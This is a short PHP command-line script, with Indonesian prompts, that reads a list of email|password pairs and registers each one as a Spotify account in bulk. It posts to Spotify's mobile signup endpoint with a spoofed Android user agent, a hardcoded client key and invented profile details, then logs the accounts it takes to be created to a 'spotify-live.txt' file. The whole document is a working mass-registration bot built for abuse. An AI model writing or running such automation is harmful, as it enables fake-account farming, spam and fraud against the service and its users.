<?php

echo "List Empas Yang Mau Di Buat  : ";
$xyz = trim(fgets(STDIN));

foreach (explode("\n", str_replace("\r", "", file_get_contents($xyz))) as $key => $akun) {
 	$pecah = explode("|", trim($akun));
	$email = trim($pecah[0]);
	$passwd = trim($pecah[1]);

$headers = array();
$headers[] = 'User-Agent: Spotify/8.5.51 Android/22 (SM-A908N)';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';


$gas = curl('https://spclient.wg.spotify.com/signup/public/v1/account/', 'key=142b583129b2df829de3656f9eb484e6&password='.$passwd.'&creation_point=client_mobile&name=Aww&gender=male&iagree=true&platform=Android-ARM&birth_day=6&birth_month=4&birth_year=2006&password_repeat='.$passwd.'&email='.$email.'', $headers);
	if (strpos($gas[1], 'Email itu sudah terdaftar pada akun.')) {
		echo "[Gagal] $email|$passwd\n";
	} else {
		echo "[Success Register] $email|$passwd\n";
		fwrite(fopen("spotify-live.txt", "a"), "[Success Register] | $email|$passwd \n");
	}
}

function curl($url,$post,$headers)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	if ($post !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
	$result = curl_exec($ch);
	$header = substr($result, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
	$body = substr($result, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
	preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
	$cookies = array();
	foreach($matches[1] as $item) {
	  parse_str($item, $cookie);
	  $cookies = array_merge($cookies, $cookie);
	}
	return array (
	$header,
	$body,
	$cookies
	);
}
